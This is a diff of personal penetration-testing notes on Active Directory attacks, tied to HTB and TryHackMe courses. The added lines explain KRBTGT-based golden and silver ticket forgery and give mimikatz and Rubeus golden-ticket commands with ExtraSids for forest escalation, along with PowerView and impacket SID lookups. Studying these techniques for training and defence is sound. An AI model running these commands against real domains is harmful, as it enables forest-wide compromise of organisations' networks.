@@ -70,6 +70,7 @@ NetNTLM is a challenge-response protocol based on NTLM.
 #### Kerberos
 
 [![password_attacks](../../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
+[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
 [![attacktivedirectory](../../../../cybersecurity/_badges/thm-p/attacktivedirectory.svg)](https://tryhackme.com/r/room/attacktivedirectory)
 
 Kerberos is a protocol used to provide secure authentication over non-secure networks. It replaces NTLM and NetNTLM.
@@ -83,6 +84,8 @@ When the user wants to access a network resource, such as a shared folder or a d
 ```ps
 PS> klist # list current tickets available
 ```
+
+📚 The KRBTGT service account is used to encrypt/sign all Kerberos tickets granted within a given domain. Given the NT hash for the KRBTGT account, we can forge [golden/silver](/cybersecurity/red-team/s5.post-exploitation/index.md#-lateral-movement---goldensilver-ticket) tickets.
 </div></div>
 
 <hr class="sep-both">
@@ -288,7 +291,7 @@ Preboot Execution Environment (PXE) can be used to allow devices to install the 
 
 We can use [powerpxe](https://github.com/wavestone-cdt/powerpxe) <small>(0.1k ⭐)</small>.
 
-```
+```shell!
 PS> powershell -executionpolicy bypass
 PS> Import-Module .\PowerPXE.ps1
 PS> # Example: manually execute some steps
@@ -369,8 +372,6 @@ PS> .\Rubeus.exe asreproast /user:cn /nowrap /format:hashcat
 Refer to [cracking Kerberos Pre Auth Hash](/cybersecurity/cryptography/algorithms/hashing/index.md#kerberos-pre-auth-cracking).
 
 📚 Using LDAP, search for users with `userAccountControl>=4194304`.
-
-<br>
 
 #### Kerberoasting — Privilege Escalation
 
@@ -462,6 +463,25 @@ This attack is called ExtraSids Attack on HTB. Microsoft implemented SID filteri
 
 If a domain is compromised, we can add to `sidHistory` the SID of a group such as `Enterprise Admins`' SID and compromise the forest. 
 
+```shell!
+mimikatz# kerberos::golden /user:dummy /domain:dev.example.com /sid:<child domain SID> /krbtgt:<hash> /sids:<target domain SID> /ptt
+PS> .\Rubeus.exe golden /rc4:<krbtgt hash> /domain:dev.example.com /sid:<child domain SID>  /sids:<target domain SID> /user:dummy /ptt
+```
+
+You can use PowerView or Active Directory Module on Windows:
+
+```shell!
+PS> Get-DomainSID # Powerview
+PS> Get-DomainGroup -Domain example.com -Identity "Enterprise Admins" | select distinguishedname,objectsid # Powerview
+PS> Get-ADGroup -Identity "Enterprise Admins" -Server "example.com" # AD Module 
+```
+
+On Linux, you can use impacket:
+
+```shell!
+$ # concatenate DOMAIN_SID and GROUP_RID to get GROUP_SID
+$ impacket-lookupsid dev.example.com/username:'password'@IP
+```
 
 📚 If a user is migrated to another forest and SID filtering is disabled, then they retain their rights on their original domain.
 
@@ -565,6 +585,7 @@ Stuff that I found, but never read/used yet.
 * Advanced Security Audit Policy
 </div><div>
 
+* [adsecurity](https://adsecurity.org/)
 * Hardening AD ([ref](https://blog.netwrix.fr/2019/05/06/securiser-votre-annuaire-ad-contre-les-attaques-de-malware/))
 * [kerberos/AD cyber](https://zer1t0.gitlab.io/posts/)
 
